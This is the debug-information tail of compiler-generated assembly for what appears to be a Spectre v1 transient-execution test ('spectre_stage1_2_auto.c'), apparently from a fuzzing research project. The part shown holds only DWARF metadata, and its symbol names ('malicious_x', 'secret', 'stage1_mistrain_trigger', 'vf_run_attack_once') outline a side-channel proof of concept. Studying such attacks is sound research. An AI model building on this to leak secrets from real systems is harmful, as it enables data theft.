	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x14
	.uleb128 0x26
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x15
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x16
	.uleb128 0x21
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2f
	.uleb128 0x6
	.byte	0
	.byte	0
	.uleb128 0x17
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2117
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x18
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x19
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x1a
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x1b
	.uleb128 0xb
	.byte	0x1
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x1c
	.uleb128 0x1d
	.byte	0x1
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x52
	.uleb128 0x1
	.uleb128 0x55
	.uleb128 0x17
	.uleb128 0x58
	.uleb128 0xb
	.uleb128 0x59
	.uleb128 0xb
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x1d
	.uleb128 0x5
	.byte	0
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x1e
	.uleb128 0x4109
	.byte	0x1
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x31
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x1f
	.uleb128 0x410a
	.byte	0
	.uleb128 0x2
	.uleb128 0x18
	.uleb128 0x2111
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x20
	.uleb128 0x4109
	.byte	0
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x31
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x21
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2117
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x22
	.uleb128 0xb
	.byte	0x1
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.byte	0
	.byte	0
	.uleb128 0x23
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x24
	.uleb128 0x4109
	.byte	0
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x2115
	.uleb128 0x19
	.uleb128 0x31
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x25
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x26
	.uleb128 0x1d
	.byte	0x1
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x58
	.uleb128 0xb
	.uleb128 0x59
	.uleb128 0xb
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x27
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x20
	.uleb128 0xb
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x28
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x29
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x2a
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x20
	.uleb128 0xb
	.uleb128 0x34
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x2b
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x2c
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x20
	.uleb128 0xb
	.uleb128 0x34
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x2d
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x2e
	.uleb128 0x18
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x2f
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2117
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x30
	.uleb128 0x2e
	.byte	0
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3c
	.uleb128 0x19
	.uleb128 0x6e
	.uleb128 0xe
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.byte	0
	.byte	0
	.byte	0
	.section	.debug_loc,"",@progbits
.Ldebug_loc0:
.LLST10:
	.quad	.LVL28
	.quad	.LVL29
	.value	0x1
	.byte	0x55
	.quad	.LVL29
	.quad	.LFE5069
	.value	0x4
	.byte	0xf3
	.uleb128 0x1
	.byte	0x55
	.byte	0x9f
	.quad	0
	.quad	0
.LLST11:
	.quad	.LVL28
	.quad	.LVL34-1
	.value	0x1
	.byte	0x54
	.quad	.LVL34-1
	.quad	.LFE5069
	.value	0x4
	.byte	0xf3
	.uleb128 0x1
	.byte	0x54
	.byte	0x9f
	.quad	0
	.quad	0
.LLST12:
	.quad	.LVL30
	.quad	.LVL34-1
	.value	0x1
	.byte	0x55
	.quad	0
	.quad	0
.LLST13:
	.quad	.LVL30
	.quad	.LVL31
	.value	0x2
	.byte	0x30
	.byte	0x9f
	.quad	.LVL31
	.quad	.LVL32
	.value	0xd
	.byte	0x70
	.sleb128 0
	.byte	0x3
	.quad	array2
	.byte	0x1c
	.byte	0x9f
	.quad	.LVL32
	.quad	.LVL33
	.value	0xf
	.byte	0x70
	.sleb128 0
	.byte	0x3
	.quad	array2
	.byte	0x1c
	.byte	0x23
	.uleb128 0x1
	.byte	0x9f
	.quad	.LVL36
	.quad	.LVL37
	.value	0x2
	.byte	0x30
	.byte	0x9f
	.quad	.LVL37
	.quad	.LVL39
	.value	0x1
	.byte	0x53
	.quad	.LVL39
	.quad	.LVL40-1
	.value	0x1
	.byte	0x51
	.quad	.LVL40-1
	.quad	.LVL40
	.value	0x3
	.byte	0x73
	.sleb128 -1
	.byte	0x9f
	.quad	.LVL40
	.quad	.LVL41
	.value	0x1
	.byte	0x53
	.quad	0
	.quad	0
.LLST14:
	.quad	.LVL36
	.quad	.LVL37
	.value	0x1
	.byte	0x50
	.quad	.LVL37
	.quad	.LVL43
	.value	0x1
	.byte	0x56
	.quad	0
	.quad	0
.LLST15:
	.quad	.LVL38
	.quad	.LVL40
	.value	0xa
	.byte	0x3
	.quad	.LC0
	.byte	0x9f
	.quad	0
	.quad	0
.LLST8:
	.quad	.LVL24
	.quad	.LVL25
	.value	0x1
	.byte	0x55
	.quad	.LVL25
	.quad	.LVL26
	.value	0x3
	.byte	0x75
	.sleb128 1
	.byte	0x9f
	.quad	.LVL26
	.quad	.LFE5068
	.value	0x4
	.byte	0xf3
	.uleb128 0x1
	.byte	0x55
	.byte	0x9f
	.quad	0
	.quad	0
.LLST9:
	.quad	.LVL26
	.quad	.LVL27
	.value	0x2
	.byte	0x30
	.byte	0x9f
	.quad	0
	.quad	0
.LLST7:
	.quad	.LVL21
	.quad	.LVL22
	.value	0x15
	.byte	0x3
	.quad	secret
	.byte	0x6
	.byte	0x3
	.quad	array1
	.byte	0x1c
	.byte	0x9f
	.quad	.LVL22
	.quad	.LVL23-1
	.value	0x1
	.byte	0x55
	.quad	0
	.quad	0
.LLST2:
	.quad	.LVL7
	.quad	.LVL8
	.value	0x1
	.byte	0x55
	.quad	.LVL8
	.quad	.LVL19
	.value	0x1
	.byte	0x56
	.quad	.LVL19
	.quad	.LFE5066
	.value	0x4
	.byte	0xf3
	.uleb128 0x1
	.byte	0x55
	.byte	0x9f
	.quad	0
	.quad	0
.LLST3:
	.quad	.LVL7
	.quad	.LVL8
	.value	0x2
	.byte	0x4d
	.byte	0x9f
	.quad	.LVL8
	.quad	.LVL11
	.value	0x1
	.byte	0x5c
	.quad	.LVL11
	.quad	.LVL12
	.value	0x1
	.byte	0x54
	.quad	.LVL12
	.quad	.LVL18
	.value	0x3
	.byte	0x7c
	.sleb128 1
	.byte	0x9f
	.quad	.LVL18
	.quad	.LVL20
	.value	0x1
	.byte	0x5c
	.quad	0
	.quad	0
.LLST4:
	.quad	.LVL9
	.quad	.LVL18-1
	.value	0x1
	.byte	0x52
	.quad	.LVL18-1
	.quad	.LVL20
	.value	0xb
	.byte	0x7c
	.sleb128 1
	.byte	0x3f
	.byte	0x1a
	.byte	0xc
	.long	0xffffffff
	.byte	0x1a
	.byte	0x9f
	.quad	0
	.quad	0
.LLST5:
	.quad	.LVL13
	.quad	.LVL14
	.value	0x1
	.byte	0x50
	.quad	.LVL14
	.quad	.LVL15
	.value	0x6
	.byte	0x71
	.sleb128 0
	.byte	0x70
	.sleb128 0
	.byte	0x21
	.byte	0x9f
	.quad	.LVL15
	.quad	.LVL16
	.value	0x1
	.byte	0x50
	.quad	.LVL16
	.quad	.LVL17
	.value	0x6
	.byte	0x75
	.sleb128 0
	.byte	0x72
	.sleb128 0
	.byte	0x27
	.byte	0x9f
	.quad	.LVL17
	.quad	.LVL18-1
	.value	0x1
	.byte	0x55
	.quad	0
	.quad	0
.LLST6:
	.quad	.LVL9
	.quad	.LVL10
	.value	0xa
	.byte	0x3
	.quad	array1_size
	.byte	0x9f
	.quad	0
	.quad	0
.LLST0:
	.quad	.LVL0
	.quad	.LVL1-1
	.value	0x1
	.byte	0x55
	.quad	.LVL1-1
	.quad	.LVL2
	.value	0x1
	.byte	0x53
	.quad	.LVL2
	.quad	.LFE5064
	.value	0x4
	.byte	0xf3
	.uleb128 0x1
	.byte	0x55
	.byte	0x9f
	.quad	0
	.quad	0
.LLST1:
	.quad	.LVL4
	.quad	.LVL5
	.value	0x1
	.byte	0x55
	.quad	.LVL5
	.quad	.LVL6
	.value	0x1
	.byte	0x50
	.quad	.LVL6
	.quad	.LFE5065
	.value	0x4
	.byte	0xf3
	.uleb128 0x1
	.byte	0x55
	.byte	0x9f
	.quad	0
	.quad	0
	.section	.debug_aranges,"",@progbits
	.long	0x3c
	.value	0x2
	.long	.Ldebug_info0
	.byte	0x8
	.byte	0
	.value	0
	.value	0
	.quad	.Ltext0
	.quad	.Letext0-.Ltext0
	.quad	.LFB5069
	.quad	.LFE5069-.LFB5069
	.quad	0
	.quad	0
	.section	.debug_ranges,"",@progbits
.Ldebug_ranges0:
	.quad	.LBB18
	.quad	.LBE18
	.quad	.LBB22
	.quad	.LBE22
	.quad	.LBB23
	.quad	.LBE23
	.quad	0
	.quad	0
	.quad	.Ltext0
	.quad	.Letext0
	.quad	.LFB5069
	.quad	.LFE5069
	.quad	0
	.quad	0
	.section	.debug_line,"",@progbits
.Ldebug_line0:
	.section	.debug_str,"MS",@progbits,1
.LASF81:
	.string	"pmu_uops_print_results"
.LASF29:
	.string	"_old_offset"
.LASF58:
	.string	"double"
.LASF42:
	.string	"_IO_FILE"
.LASF53:
	.string	"sys_nerr"
.LASF24:
	.string	"_IO_save_end"
.LASF65:
	.string	"temp"
.LASF5:
	.string	"short int"
.LASF12:
	.string	"size_t"
.LASF34:
	.string	"_offset"
.LASF18:
	.string	"_IO_write_ptr"
.LASF13:
	.string	"_flags"
.LASF48:
	.string	"_IO_2_1_stdout_"
.LASF25:
	.string	"_markers"
.LASF15:
	.string	"_IO_read_end"
.LASF11:
	.string	"uint8_t"
.LASF59:
	.string	"array1_size"
.LASF85:
	.string	"spectre_stage1_2_auto.c"
.LASF83:
	.string	"pmu_uops_snap_after"
.LASF64:
	.string	"secret"
.LASF56:
	.string	"float"
.LASF52:
	.string	"stderr"
.LASF55:
	.string	"long long int"
.LASF33:
	.string	"_lock"
.LASF6:
	.string	"long int"
.LASF79:
	.string	"pmu_stage1_get_count"
.LASF90:
	.string	"printf"
.LASF30:
	.string	"_cur_column"
.LASF7:
	.string	"__uint8_t"
.LASF86:
	.string	"/home/cas/transient_execution/x86/transientfail/fuzz_for_transient_x86/test"
.LASF46:
	.string	"_pos"
.LASF71:
	.string	"vf_run_attack_once"
.LASF61:
	.string	"array1"
.LASF67:
	.string	"argv"
.LASF72:
	.string	"stage1_mistrain_trigger"
.LASF45:
	.string	"_sbuf"
.LASF0:
	.string	"unsigned char"
.LASF9:
	.string	"__off64_t"
.LASF66:
	.string	"argc"
.LASF84:
	.string	"GNU C11 7.5.0 -mtune=generic -march=x86-64 -g -O2 -fstack-protector-strong"
.LASF4:
	.string	"signed char"
.LASF57:
	.string	"long long unsigned int"
.LASF47:
	.string	"_IO_2_1_stdin_"
.LASF2:
	.string	"unsigned int"
.LASF43:
	.string	"_IO_marker"
.LASF32:
	.string	"_shortbuf"
.LASF68:
	.string	"malicious_x"
.LASF17:
	.string	"_IO_write_base"
.LASF41:
	.string	"_unused2"
.LASF14:
	.string	"_IO_read_ptr"
.LASF21:
	.string	"_IO_buf_end"
.LASF76:
	.string	"_mm_clflush"
.LASF74:
	.string	"spectre_function"
.LASF10:
	.string	"char"
.LASF89:
	.string	"main"
.LASF44:
	.string	"_next"
.LASF35:
	.string	"__pad1"
.LASF36:
	.string	"__pad2"
.LASF37:
	.string	"__pad3"
.LASF38:
	.string	"__pad4"
.LASF39:
	.string	"__pad5"
.LASF80:
	.string	"pmu_stage1_get_delta"
.LASF73:
	.string	"training_x"
.LASF1:
	.string	"short unsigned int"
.LASF77:
	.string	"__fmt"
.LASF49:
	.string	"_IO_2_1_stderr_"
.LASF3:
	.string	"long unsigned int"
.LASF19:
	.string	"_IO_write_end"
.LASF60:
	.string	"unused1"
.LASF62:
	.string	"unused2"
.LASF27:
	.string	"_fileno"
.LASF26:
	.string	"_chain"
.LASF75:
	.string	"vf_get_probe_addr_for_secret"
.LASF8:
	.string	"__off_t"
.LASF23:
	.string	"_IO_backup_base"
.LASF50:
	.string	"stdin"
.LASF20:
	.string	"_IO_buf_base"
.LASF28:
	.string	"_flags2"
.LASF40:
	.string	"_mode"
.LASF16:
	.string	"_IO_read_base"
.LASF70:
	.string	"vf_prepare_probe_region"
.LASF63:
	.string	"array2"
.LASF31:
	.string	"_vtable_offset"
.LASF78:
	.string	"__printf_chk"
.LASF22:
	.string	"_IO_save_base"
.LASF54:
	.string	"sys_errlist"
.LASF88:
	.string	"_IO_FILE_plus"
.LASF69:
	.string	"candidate_count"
.LASF82:
	.string	"pmu_uops_snap_before"
.LASF51:
	.string	"stdout"
.LASF87:
	.string	"_IO_lock_t"
	.ident	"GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0"
	.section	.note.GNU-stack,"",@progbits
